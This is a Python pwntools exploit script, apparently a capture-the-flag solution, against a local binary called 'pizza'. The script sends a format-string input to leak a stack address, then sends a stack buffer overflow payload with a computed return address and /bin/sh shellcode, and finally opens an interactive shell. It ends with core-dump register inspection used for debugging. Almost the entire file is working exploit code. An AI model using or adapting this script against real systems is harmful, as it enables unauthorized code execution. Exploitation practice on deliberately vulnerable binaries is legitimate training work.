#!/usr/bin/env python3

from pwn import *

# context.log_level = 'error'

# Executable and Linkable Format
elf = ELF("./pizza")

context(arch='amd64', os='linux', endian='little', word_size=64)

getname_address = elf.symbols["getname"]

shellcode = asm(shellcraft.amd64.linux.sh())

print(f"Shellcode: {shellcode.hex().upper()}")
print(len(shellcode))

input1 = b"Cantinflas %p %p %p %p %p %p %p"

victim = process("./pizza")
print(str(victim.recvline(), "latin-1"))
victim.sendline(input1)
leak = str(victim.recvline(), "latin-1").split()[-1]
print(leak)
leak_int = int(leak, 16)
shellcode_place = leak_int + 0x20


input2 = b"A" * 128 + b"CCCCCCCC" + p64(shellcode_place) + shellcode#b"AABBAABB"
print(str(victim.recvline(), "latin-1"))
victim.sendline(b"10")
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))
print(str(victim.recvline(), "latin-1"))

victim.sendline(input2)

#victim.sendline(payload)
#victim.wait()
victim.interactive()

core = victim.corefile
rsp = core.rsp
rbp = core.rbp
rip = core.rip

tos = core.read(rsp, 8)
tos1 = core.read(rsp+8, 8)
tos2 = core.read(rsp+16, 8)


print(f"rsp: {hex(rsp)}")
print(f"rbp: {hex(rbp)}")
print(f"rip: {hex(rip)}")

print(f"Top of stack contains: {hex(int.from_bytes(tos, 'little'))}")
print(f"Top of stack contains: {hex(int.from_bytes(tos1, 'little'))}")
print(f"Top of stack contains: {hex(int.from_bytes(tos2, 'little'))}")

print(f"I think the shellcode is at {hex(shellcode_place)}")
